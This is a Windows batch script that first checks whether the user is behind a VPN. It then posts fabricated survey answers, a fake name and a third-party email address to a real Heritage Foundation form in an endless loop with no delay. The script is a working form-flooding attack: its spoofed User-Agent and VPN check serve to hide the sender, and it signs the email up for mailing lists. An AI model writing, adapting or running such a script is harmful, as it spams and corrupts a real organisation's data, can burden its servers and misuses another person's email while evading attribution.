@echo off

:: get ip for detector
for /f "tokens=*" %%i in ('curl -s https://eth0.me') do set IP=%%i

:: Validate if we got an IP
if "%IP%"=="" (
    echo cant get ip.
    exit /b 1
)

:: check if vpn
for /f "tokens=*" %%i in ('curl -s https://ipapi.co/%IP%/json/') do set IP_INFO=%%i

:: start if  using vpn or bypassed
echo %IP_INFO% | findstr /C:"\"vpn\":true" >nul
if %errorlevel%==0 (
    echo Starting >:3
    call :start_loop
) else (
    echo WARNING: no vpn detected. continue? (y/n)
    set /p CONFIRM=
    if /i "%CONFIRM%"=="y" (
        call :start_loop
    ) else (
        echo Exiting.
        exit /b 1
    )
)

:: Start the loop function
:start_loop
echo Starting requests to...
:loop
curl -s "https://secured.heritage.org/fsg?lp-form-submit-method=ajax&pageId=8ca50478-71cb-4b45-ace2-29d0b64673a3&variant=i" ^
  -H "accept: */*" ^
  -H "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36" ^
  --data-raw "pageId=8ca50478-71cb-4b45-ace2-29d0b64673a3&pageVariant=i&environmental_protection_agency_=4&federal_bureau_of_investigation_=1&department_of_education_=1&department_of_housing_and_urban_development_=3&department_of_state_=2&45_million_for_a_diversity_and_inclusion_scholarship_in_burma_=Very+supportive+&3_million_for_girlcentered_climate_action_in_brazil_=Very+supportive+&125_million_to_push_critical_race_theory_in_public_health_policy_=Very+supportive+&280000_for_diverse_bird_watcher_groups_=Very+supportive+&3267000_to_build_a_transgender_health_guide_website_meant_to_increase_access_to_genderaffirming_care_also_known_as_mutilation__=Very+supportive+&do_you_believe_the_federal_government_needs_to_be_responsible_with_taxpayer_dollars_and_not_spend_more_money_than_it_takes_in=Undecided&do_you_support_significant_cuts_to_the_federal_budget_to_eliminate_budget_deficits_and_pay_down_the_national_debt=No&do_you_believe_the_department_of_government_efficiency_doge_will_be_an_effective_tool_for_eliminating_excessive_government_spending_=No&first_name=My+Name&last_name=Is+Meow&email=yiffer12%40gmail.com&utm_campaign=&utm_source=&utm_medium=&utm_content=&Heritage_Foundation_Subscriber=TRUE&Agenda_Subscriber=TRUE&unsubscribed_from_heritage=FALSE&unsubscribed=FALSE" > nul
echo CURL request sent at %date% %time%
timeout /t 0 > nul
goto loop
